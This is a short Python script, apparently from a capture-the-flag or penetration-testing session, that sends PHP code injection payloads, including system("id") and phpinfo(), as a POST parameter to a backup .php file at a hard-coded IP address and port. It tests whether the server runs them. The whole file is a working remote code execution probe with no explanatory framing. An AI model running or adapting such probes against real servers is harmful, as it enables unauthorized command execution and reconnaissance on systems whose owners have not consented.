#!/usr/bin/env python3
import requests

# Try POST to the .bak file 
url = 'http://61.147.171.35:51810/s3Cr37_f1L3.php.bak'

# Try executing commands
commands = [
    'echo "test";',
    'phpinfo();',
    'system("id");',
    'var_dump($_SERVER);',
]

for cmd in commands:
    print(f'Trying: {cmd}')
    r = requests.post(url, data={'admin': cmd})
    if '<?php' not in r.text and 'Not Found' not in r.text:
        print(f'Response: {r.text}')
    else:
        print(f'Got static file or 404')
    print()
